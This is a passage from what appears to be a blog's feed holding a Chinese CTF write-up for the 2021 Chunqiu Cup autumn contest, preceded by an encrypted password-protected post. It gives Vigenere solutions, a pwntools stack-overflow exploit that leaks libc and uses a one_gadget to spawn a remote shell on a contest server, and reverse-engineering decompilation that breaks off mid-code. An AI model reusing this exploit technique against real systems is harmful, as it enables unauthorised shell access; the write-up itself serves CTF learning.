9d086a2270a0a95b3750850c439bc83832fd025a8b0ef3bb764ac3dd81ce407cdd58e913f741d010a5b3533011e1f4dffa9391a1b1fea20deb3ebde53e8b659d22d02b4e0717719224aba471773115ba1da218c12fa55c2c35e6efbbe525d235f6ad17f79dad270ac4d04dcf38611fea50b99349625ee034d09633486ccdb06434bc0a7ccc863a958df50fed58dec3b2dff9392b920543f36493e4a9d2c5dd0ba16c7228d735e0bd397b03723fecfd3c0a68a9aef9a7db4477ede6942a0ddb38d35dd72a7b1c43e9ddbfb4182236b536a084d1f99c225b19bfc4bdc0d7547b158715c7a204a8d3b62670ae257337788147b20b52c91a7860e4e2361fa17597ad922a9fa53a34cd9c9e3e3648a8d03d8b7672ca74bbff7a5d44bbe82210f35f297c1cfba7741e618895146847b52a9dec77b72ac597e9ae32320f0f215259583c63bda9212a4e9fa167e19f543e5ed74ddabc40751b57d0e9a82ab755c468c52acb3b7399067913105aabd163fcd9eaf74f9f5a9c49911349210ab5f55b30c16171a827822166d86b40484d09fb8841c607b3a064f5e3e0f9124bd934f3b81223e8c9ec5eac581a7ff23835def4d3070a44027a2bb83d7072eb9eca073eaa9bd20599ea233813ccbfe129839d2668286695855ce060dfb8916d387e34ceafdd1f55b29a190893c1bda02f979847679ceecd72d16f271c5adcb8e3d3d1fbe9f3839305a48c6fd466a35ab7ec84348a8a717d254cb2197eb476ce4718b32162a71ea3f83ae6989052d177b75a763693b27d2f40c5e16d9581bdc76c904a47cc6eb0352248416849b041ff3ed2a53f9cd2652ed808677f68da8c85cda6a43542e4c7226401c76e0409dbbab4282c7274bdbeffbc58b2b66f0b9b35830fe9b754603293731f76be89b364a9ee93ba1bf3e8a774b077b4728cf794b034355e5a8a8a9c15fdab89ca7fac84f761790cf83d2c79a444b7e4c0e09656eb9600d33e967a60ffa74f4265c923a1975047257cbed01bd068c53ef4da4e00efcf77b6613e35d8ae3e49b646d911a34785422d4e27d1f523b80d270339efb5462d955184f318240b5907b6c45523c34b835bfd05f9e3d622ffe7a26ea40772aa767ad7bd3b67e9338cff2c5624f7e4063f0608713bad5f5f35ee1bf43907113fbd3b294f5c8f34fee8ff0878f0c5ebb95d137d903c045d094208cc671794e6f63a313301811c95d484e3cd54bef89b49cde65a25da252c066a7e4cb26dafba77b15e7310d3c3b0fce262fc2290018701d17b8e3f482da261a79079bc606d9b72d987c347a75f6559f9dd1a0ef0e4b571ebe7d0bbc605a220d927fbdbbadbec4dd963d2d6171f988333b71b3c78da730e8b2485c8f536f3a45740240bbc466afe15b65ba083a0cbccfd11e373e927bcad12d21401efcdf827dd6de6e7c0a9173161332bba463408254052a0aeed3a3182dda6bb9dabf0784611ebcadf16405341943e18d6755cb8b9afc59e49b29bb95c0a64d92a29de05fadd599f8a5872a613125d84459da3244146e735ce9791b47de951a585eedd1a3c32799596413d894ca94d90f4065fbfd4dca7ee69f9f9875457f5c0e793c5be4a9358b142f735bdd0c1887e72d2ce64293d0d3e8de4d1e5804cdb3236e597d0a197323653e716764afa67d13338b827eec37788cd2bbe50a12d819d053a8cebfef71391acadb567158a369f5829adc61a228ec86ef3c44f6554d03399bc88da6bec7dad53c7d76763cfd32c21dcbcc9163ea08e2affefbcd9e66d2163f08f8d6a3583063bb8b070578fa9a0a5aee2abdb57c229af88cd6d845f744ae9582b7fbb5e5cd38e90e3ca764e3df1e374c773eb5822e667af3ff21f6e6e8f0c3043438aae4fd18c902e696938a680d9d67969d569e856364b47d0fae3037d991f7526706d2b85684ce73b4ab7c045f8033d93c0545d72a329babfe5ced3cd42263e78d8890163881d56c6fd6a909d795ec6d442ebd8190ab0074eb01950913cbd39fa7adb730e93c9e553655656eef5b44f02e27259795632ed11d46a97bb536bf729ea7d168db00b383f0db5c2b91057c7fa32777b8a4686b898f8f5f9b05c22c602a9d2470b7de5e49201e36544fa039a56367fa6a56ab88eb07717b38f052b6a47ed83c0a2e9edf8823529b172cd7e38dd769b1334064cbee070b7de4b5878aa8868bb8590a44be05e27293f0db9179f35c343ee9891754390fe8eb0010282f43f32273e455310b205b17fccd3552d81fad10b17c1376fe58bad29f139cfc0fc52ec3639a1788e82c304658be194031da0629aad920a81ff993496f50013b421296e1c0d62aa2628fffaa7670d927c8d6743d734226f8997b19cfe576b50320747f43bc264ed4283d4914ed89bcd79a081a959b0704e734c4970c5fbe32e228b7dacb31542cab50524711f4d1ac1a900694496131e7eb3f17a9d8d9fd4573f0220f357dd42be39041b87c8f5eff6a8d0df9f791b14fe6dd973d536a7e1ac4a5c7b99dc1914cb3dbc5443acf90f30b61884ca0e72ea59b140e287dc7568947d8ae6945a3e2a47bfeb39e73a6be23dab8e5d4d158802c9c342b210e784946ca29263b68f63988f0fd53ed9437a1f04e3c0353bc3c6f850cf20913af8d85f8ec65876eeee11261d2157b07536a241e2dfdac77e6af88195e4ac4fd5f7a894304a51eec9b7ac8cb4c942360f48df996f9b6082611a121c1648faf6c1fc7105eefc30f16905de1d19bfd1e85ffb09122ed8bc374bcd677410c7e22a80cd60278b163c6ac3a32d6dd8a188fc0c34cb4b668c8d7e53bba261ef56133f712eb41f12c24d5b85e64bf353e9d8e7df9afd61bcd51fc656e2eb73b07adb472790e5ab8b23fa989e46952bc3ef3e2cdcb86e4870cef54e2243a65c70b420e4255a2cb879c9457e453289466e596ae1352af157945c1147514da7d5bce48d1402937b8ceb33fddfd395836a2f9b414c8e0757ded6e17588f3ee99f19930f6fcef155fca19f7e846fbc62bc11866a1abf72b07a9b425ef4bbb3e8d043a3b647c816cdc98eb39183e6d99a5ad0e0153a958e38fcfc26d7e6365a07bb392b179ab414c5dc0ddacb6bcfff2a91addfca405ff85c61e9a9b2d7344e76906dad5a813e0cbb214d08797beebcbaf603e4a1f68dd8d2f22928d17b9c8575f60b0a3f0522d9769e344496470626d399fe7f69a4ee4fffe94f00bbcc5b290ca2b9e26dfdf9f5d02e5af8d9b0acd0bf744d2f1d61b7c5babf39a34eb56487b9bb26ed7b4cd2324210b3fe2f8eddab043c0036735821a53f80b17a3696aef6472d8bd8cc092cbc1f5c41a78a09e90b9e4c87751662fd36bee98a9e14e9051d7bd47b453076cc3a5b8c5fda349bb440c857c6181607ac531171d4b765919642fdd51dc72e34cadd41794fa99dfcd776d9a360ff830cb4f89961d2b27326e550c0ca7f3f8f7d2c60fcf2f742c0da049675cce2e8b8fe23be02c7e9fab2c074431a88c5985bbe3383aaddac63c56975482d47cb768a21720b7efc5e172cce170c4432c19c9af5e2657bfb100acb5df2b39929857508255c590273e28c4636fec04f18de66d2292b455e994a67821d5ed7227ebe9eca34634e46d6dd5883dec9c6fd65e7aebfe2e45038fbc4705728d2983d1e6e4955ea2e694c326ae827b3acac451b20776f77aa6258b3ff218e519f06674622ffcf045c94fb79d599ba67fd1b2583094d0279f79ae6f662bc81aa56ae94e38a2f68b32816ada6561f21c18767b276f72bc6bf02715cec04c402bde1b5784c2fde7bb641833bf269dabb851f769fc1eecc55f70dbef2a3b8b971ff7e4392e1e100a0c797a70fabbab7f5f8df29408d67d8275dd3f606fd059509244d778ddf2b7f48119555c6c601562e185e84f9689dad7467255867c8a99b4779f191ebebbf65270cdfe9abca77560497b820aab5dd1cd507d33428fe7313c3486ecccb6a9830ec2a7328739dc47670a4b7a6ec57f022131db122790fab4ed637260a2fb61242b6bcb630023347a235d7cfac7071cd7d9de00713d515544aae2acb6049aa64f407ce6a964cd388c090283d074ccea87a9f44c56b7fd97c6ea4a7cb34b9ec17916846e695509458c32902e999eca194f4b1a7578e8b84c003429e5044cecad2eee25ff23839e7f9f303acf5c0e3a8dd10304e1b00732e6efa7825e01cc1259bc46bfabc82bdf9dcb97a1d1fdec259e5a54580a23d2d3f9d1c3be7ba7d2529ae64c07050e58ebcc6edcf1f140001d068ab17de868d857edf14f976a97fe35c797171abe42dfe00b59f7601764a3c5dc538c915938636ef354c462e89b8b99dbff2c2e17e5f41934c4c65e22069298547a87925c10ad4996940da4fe870b62feeee32b833cd34cc388a0efe1017fbdbfa017330e211c74e00a5fac3968ea4d4ddabff8676d485fd375186916332c17cfc9eddcde725cbca479336ea8290e5acf6d0e154e7b72521878d67bf806d71c899fcd93956d81fff4e88d28314e21b618c3dd8aa22313649e8f218612ba39d618fd3c0c8b1162cf1a770e26152fed90f85e0b33568a1f18924810e01f0201cf6cb9bbfc0e7b5c8f54fd8704eff7f9c54b64f6c4884c99e7cff0d554154725b05a4c5fb8fd8ed2164897c53dbe4c502d124550d290e1d8ce5654aa5265c068747fc6ff71277315a516a5d5dbbfe4f3c4ad89f9797b16eb5b859582191d53e7eaf979891e0d936f247e16d2dd340ddd577fd7d230afc5e27e00786dff81b16e48b77ec658faf3bebe2a4f511e41067b9cb399147f0d357705221733221f89c61e90b5816f565d3d80e3c2172fe3f3fc308f8e32b9e31976d83801bd6763f1574fbd7d8365d0c09c4bf6b065ff447128b9ff249362421d252d5fcdec7020fa03cc2071ddaa247b3ade5c23a9806682648022b88ba050729a03fb0ad0d3ba61d30ac3ecf813366b9d160f6a2d5fd4d75aebabf328b13913c6e258cef1595309d43e15095b170a8f5ca190725ff95fb4763df4a071354ea96fff81edadd3fcda934303d142032b602aa69533fde4cc230dc98d7c18bf0249c85c12973e0ade6a8669cf25a8b2ea09522369b23a0e2da4175935ba94eb7a4c1dda301c9a1cbb7672015961f8da26325da8ffaca9c00e2e982148e90c3ef888a4f547720ab9b9a2c5f9271061bee72de5596a9db5793eb3bd3443bf23f1a2d34d6346aaaf22b4a94aa6d4c885b4f7252d58964165f09a02e4b3d51b3a7e8772274de4caa03aafd1c262e6a41d7641e4a3ebaafb8372790e371de295ce3d7718cad2db02a781b6e2538060d7f47a847cb0c61bea69b12e4a2aced0eab8b413871382a5a32651759b9f5d8454b9405d66024019879699efb6438d27d6685fe3d7b2c947a77d14ce678f458abddb9ea490aca184857850e9199f2b821ff4f7fce14db6ee4736a846c758c59594ebde3ed965e21ac52c413e5d4ea9e374e0ea304ac0eb3b8f5bf4e89c570a5ec7432aaaf954a6ebf8ea7bb664c08acd2d6bc99e0240d7741d0691c4b855200bbc155e051b4808e4dd094649e357bcecb9ab79588bffddb3bbea8a16f84ac9d1f04487d68013fc95edf165bd523a9a66da9d14c78529a080979d871ee53237c1d89f4e4d79422cd7b97ebbd6aa42a683860d36425e6624614eb3e8700c8ec9764b1a864d990779c8f0b4ecf991e0d8d6f5e52b73845f360024951ec19dbb206de785df19f89aab548c74e2d1fed34d61d45efbc8137ed349617f000073ecba034b7e4703c945f8e821b6a5ff475649231f154bc608ed883e853c5dcda6c3ea51c950a2709c4f8f2a2e1c0d201deff4fe6c8bd8fbdb13c3456d11aad9ba0c0105aa6dbc8a498bb8ec86e3204ff05205235974359ece2990f08cdb21bd33ab06d5f0794a90155c7c36e17e8ad682ff2bbd9fc4f11b74d3b493853de34b6d6af247f7c2a9b65ff1d2570ad3ea24382638f030e2063c7c7b615293ebf87cc964c2d8b38b9fda277e86378af077d4cb208abfb11ec7840b9cbbf54e8e81bd18ab358c2d0a8f65fadba0727e1a58b44d8065969158cfd6a9946a4420a85a3242dae6b72981f3fed8a8a647acf480f97cada7f953c02482b047b3853c6f701a3c127ec94548574009ea507e396d76f3a246052574fbc3d6887b75d23409dc56acbe6e792c76f2a4411387957ea25f5a3a26969f5666f81fb8d3357904dce99502df166f63bcb64fbf7b98f3465c180ee4d6708b393208d9a15db3a4d581ced5ce4e997c49df9c12a7df9dd672368f40003ef30d4207e07c1325ad85cf49aa390175c66927203379562b2ca9daec1eb871ae716cc1b51b09eae75b004e50a2e8ffeb069c9c2c8a6c6924ba9606576029970dd8b8c85a7d763de2982e9a1645c422907f4891c68dc870282acca1beb95dd286336b641327592e6d199f37f089baa26b0dfe631f4c5d6f3c78ade80f98d21150819acf44a1d55025eb45e29a8b12b0509b4090f439db0a7bcd9ccf3c1c493676ad4bb954026b07f441be8519e24868f96edcaf981283570654589f4d4961137cd68f3e2de5a2191c9012dc68abe2fd9249533f7a279733da276b00c9f0c273c8f4bd7e38be714e6f129aaf00faba35a1c7695bc8a52e7c68595f2d8aa6e6c47464c3d15a9817044caf2b7e62e297dfcd369dc44320d08f54695c59efd8204895be6a51045de5edc35b46e408e0e2d7c5143296b4b272edc1db1cdc3883e3dcd5ae403f4d55a078b3c2827e0932f7daac94e38d5e9cde4190f74319af52a2accf03ee1bc570425081ac426befd31f58c6cedff1ea8a8afea6994da56667af93298f319e551fa7eab33e31d17763a42789d38fcbfe703e2114c6328c901ed76c01e4f52762cb63496cd40b4abfc98db02a23de5993c44048343813393a933ebdae71cd7de1b5ea84a18551853569c1b72be3240d0a3635d9496faa4f87f47a39f441fe6c71394affc790de907fbe23158d9ffd48dee4ad339f961621e19763a17163a6fdebd776bd93f826965dcdfc537650728f0ad870393826c17ed20582bdcfb1691e67af6a3b0713fc170515c620c1bc425e2758ed29edb3c876c8dba61d485fb21f7ca20607bb94c0092ee66153828b320a673de0e2a58b5986a87cf646ae370f01b3ac2d5b5952774134abaabdbc3a3747bba3bcb8169075d0ba39e0d1700533d3f88fbf6e2c5448f6d73f92e1a1a0f3c821b63c3a7dc059a7c4857e4da73a5eb4f40086df74fad813fdb0147b4774594d275fed01240bc929651256e3db83804b552d9c754cc1c811f8bbc0de554ca01556f08995e32ab84372fedb5fb9ef2809c96516087b57b199617ee88eae50d841cae364c30782a2cf80dd04c049bda18e61420cbd61660738e8e03447e524173f98ef83195e9156b058b10ded76f9ce26432aa45ee7d77ba4c16d5b2c02bb0a9e62e2f09b4e0462e3b5a77153855b87fee49433c10a27e4d43a69f6258c40c7cd5630ff1b372a8feb7c094917ee714ee8b36b0ff27aa04e023c9e5bc27d3f8ccc88faee08e8965130a841f5fbe6d774af5f14329861220fec19f1a6ad5348808900154b258a8114e664d61ba9908f5b8feff5d6742e51d11481e8f62c5d7eb741c28dd86de857ec25210d30f41c75e561694c6645516aafd1918bcb730c200ff78b76ea04df1c52d98c10961749e8d4109942edbcf826bdcb8dc71fb2c80ad332d851a15f793b169eb5573720693e245d9136901626b0858c2cb26af4239d291e162ba3672dd3a144343f2d3e7d24e4fa3ac9332a995593f808062b2dc1e4f5e1bdd3b0e8d7d7d72a3309588d8d2aa93387b08df4da9a5b32bc7256f8727c974b22827a9e51003236523e962f60eb6679db5fa12f22ce826d868a9a8ea414c6560863c0226931adbc8a724bb3b3a035e9183103af913f4bd097246f6c2b35d9ebf8b4edbdd69e1ba616626bb94cdde57fc3834dd8ddc910b836686c2015414af3f3054a047f510cc73f7f56f684751dbac0ce558c4690ce2abcba23d5190fc4d34e20a04fbd87508fa9f03bdb02dd9dd7817ee452cf54679c47ccc1c8b6f47ac0d558f8c7a2ac636da126a46437e4d682ab7cfce99f383da658f1c77845df79b6c296ea8aef2c30ca69bfe06f7d111474ff0d8624dfaddfc43304fd404bf0489d782b459a8694a036b0ea83505ab70a6e899f96772421a93dd1cba63b4f7d2fc185d2a35236f393da4336eccb6d542277c9b96b6d02bcce6a421c7aa4c0c90b69164cbb2a91e8720d201dd7202b76e8516d434026b46ee5461154c662ed572453209a0b8866a286a72db15db7da692ce43734616e6bc852668d7ed1e3a72166bae9e09f4649c3a54c45d057eac040b2758d2a6390ec8e74ffc6c95408620ea88314042d957f7157513783f2d4376081f715b10467bce52d87863fde7b57b037cff2fdb03c875929379aedb3f5627203dca64238ceaa64eed58ec0b3e387a7cfd08adb3e0e143567a9c9a08957b2ec35e4142f8d10bd617d9d55afaf517c7e908e3a3a67fa4eba8f9fb665b88f38194fc642f2d103957fcc4367dd04cdd535532d3eeb2577039b772512e26460d4f4603fef1cd3ff8b7a8a645164cbb88152740557967eeaa43f01e1311e6c643bcbcb3a741e7d2a5983cdd27fd44ff5ecc605ab7c5f47c43819eaf164522ab3d65aad3499565116bd85463a29a7925b26a7df570569d68b651624fa99aa0b02b46e2da26e88f9d41480c0281c1814416731433784f3dfe977f7c0192a7c7b895203350c43595cd3b7ad735af1acef457f1ac3b004de7f37ffdbd85688f43d404daf2a36d479c2cb1e1dca1a9feadd96dad21b3010fa75fcee831812ad6840a236354f331636dadbf221fd96da7e96fa5ae5c235e76ee6eb189943d568add8cb86c7d19de49812e2dcb8b0d9ad55c343a5c60ed4b070d57596ddb20c325bb9a346e897614de0d6887179bb6c641e6e9bfa18ac896b15cbcd4b937be286fd3c1b050a698b279e78997755f0e25f5b134ec1e3fa10d0db1db49ec0cfb1b1f466cb9dc815c35f7cc28676d28bf2518ec09022b94cdb2ad34b42f82d9ce975f844e5368408f4ec5bfe80785b2840535ad58866a86d91d494577c0b9b6c3fc5a66c30bcd4032bcb5239bf3566a8d0ebfe207dae469e62508fc1db21a57bd6ec78002faa055027b286cdb6253dd4642203309d0ede626f203058f456cfe7f5b69103ef0cee75ef78a2707ff1cec7822547a4c8d299a229c7111700fe317fc6cea4549a34283c4eeffa0cd960576997a48f1b1216af349123f2c25f2074b87fad81a538daa2315a4c025f66e48fbf0ea871cea9622b6f6c5c6e1106a126e92aa44311991e91d1b5f7069c30fa19aff5a5df58f340dd1024780a030d22fb6534d3f4c457457eab6a332638352a6d39575216f49b5b6f3aa828af0884e31a49581bc4296007589b08a17c155a54b939ae89e993653798460b79f4a9d79ee771532d1f2edf9244e2bb168e3394d7de2237c5ae1645c7cee2e6a0084b1c04401c983d5bfa949804b647aeb9cf293941e3e235bff09d75991b1da14ff8f2e66fe78580f8c392aa187af4ace1a1685da272957c26bb0d3d46d6b2b24b0be0329e36fcde38681ac26819f4edd9624a9b7f0b8a04ec0fb5a7fa1d122282d33f50bb54e3f8d7fa7996e56f2d20f6a331c0d799ff48127e380eb835503822fed87f4ff2e260cfc270338d2f6b28f507a6db82070c9634c728a17af252c96f80d05cadfcf2a9119f5c6e188f287ac989eae36f9f7bda31adf73ef79e10e536406e74043ad89ee09f385ae9d2dfa2ad84937fd169472f7aa2744541380f9b041f9240dc161ccf01794ec8055798db3ca3015d0b4e0889655d3564513432976f59a9b4d88971e45ae3199e60f516037fd3ef77c707921602c665050473700d664656ac86e0999aa932b9e76999793fa65d2b3cd86fa1929a0b8984adf55bcb825f94b9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年春秋杯网络安全联赛秋季赛勇者山峰-WP</title>
      <link href="/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/"/>
      <url>/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/</url>
      
        <content type="html"><![CDATA[<p>周末抽空看下了，感觉难度差异太大，涝的涝死旱的旱死，太菜了.( ┬o┬)…<a id="more"></a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h3><p>在<a href="https://www.boxentriq.com/code-breaking/vigenere-cipher" target="_blank" rel="noopener">https://www.boxentriq.com/code-breaking/vigenere-cipher</a> 网站爆破得到为key:asterism</p><p><img src="image-20211127100844149.png" alt="image-20211127100844149"></p><p>解密得到falg。</p><p><img src="image-20211127162758654.png" alt="image-20211127162758654"></p><p>flag为：<code>flag{53d613fc-6c5c-4dd6-b3ce-8bc867c6f648}</code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="supercall"><a href="#supercall" class="headerlink" title="supercall"></a>supercall</h3><p>简单栈溢出，利用<a href="https://github.com/lexsd6/LibcSearcher_plus" target="_blank" rel="noopener">LibcSearcher</a>通过题目泄露出的<code>_IO_2_1_stdin_</code>的真实地址找到 libc 基地址，用one_gatget  来get shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/27 13:39:07</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./supercall'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'123.57.207.81'</span>,<span class="number">16985</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000000000026796 : pop rdi ; ret</span></span><br><span class="line">stack_addr=int(p.recvuntil(<span class="string">','</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">stdin_addr=int(p.recv(),<span class="number">16</span>)</span><br><span class="line">log.info(hex(stack_addr))</span><br><span class="line">log.info(hex(stdin_addr))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'_IO_2_1_stdin_'</span>,stdin_addr,num=<span class="number">9</span>)</span><br><span class="line"><span class="comment">#[-] 9: local-46e93283ff53133360e02a73ae5b5ba375410855 (source from:/mnt/d/filewsl/supercall/libc-2.27.so)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'2'</span>*<span class="number">8</span>+<span class="string">'3'</span>*<span class="number">7</span>)</span><br><span class="line">p.sendline(<span class="string">'\x00'</span>*<span class="number">0x10</span>+<span class="string">'x'</span>*<span class="number">8</span>+p64(x.ogg(num=<span class="number">0</span>)))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[-] 0: 0x4f3d5  execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>再在远程<code>cat flag</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[+] you choose gadget: 0x4f3d5</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">supercall</span><br><span class="line">$ cat f*</span><br><span class="line">flag&#123;2f3f3632-6484-4c00-82f3-a63e0d4340d9&#125;$</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><p>发现题目有UPX壳，脱壳后，用ida打开审阅发现一疑似加密flag函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40186F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">256</span>]; <span class="comment">// [esp+18h] [ebp-910h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst[<span class="number">2048</span>]; <span class="comment">// [esp+118h] [ebp-810h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+918h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+91Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_4021AD(<span class="number">22</span>, <span class="number">18</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v1[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  sub_4017D2(v1, i);#fun2</span><br><span class="line">  <span class="built_in">memset</span>(Dst, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">  sub_4015F7(v1, Dst, i); #fun1</span><br><span class="line">  sub_4021AD(<span class="number">22</span>, <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; Dst[j]; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Dst[j] != a7g5d5bayTmdlwl[j] )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"不对哦~下次再来吧~"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(asc_405016);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进fun2发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4017D2</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      result = *(<span class="keyword">unsigned</span> __int8 *)(j + a1);</span><br><span class="line">      <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a2 % i )</span><br><span class="line">        *(_BYTE *)(j + a1) ^= (_BYTE)i + (_BYTE)j;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(j + a1) ^= (<span class="keyword">unsigned</span> __int8)(j % i) + (_BYTE)j;</span><br><span 